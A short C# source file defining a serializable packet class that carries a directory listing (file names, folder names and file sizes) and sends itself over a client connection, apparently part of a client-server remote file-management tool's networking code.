using System;
using xServer.Core.Networking;

namespace xServer.Core.Packets.ClientPackets
{
    [Serializable]
    public class GetDirectoryResponse : IPacket
    {
        public string[] Files { get; set; }

        public string[] Folders { get; set; }

        public long[] FilesSize { get; set; }

        public GetDirectoryResponse()
        {
        }

        public GetDirectoryResponse(string[] files, string[] folders, long[] filessize)
        {
            this.Files = files;
            this.Folders = folders;
            this.FilesSize = filessize;
        }

        public void Execute(Client client)
        {
            client.Send(this);
        }
    }
}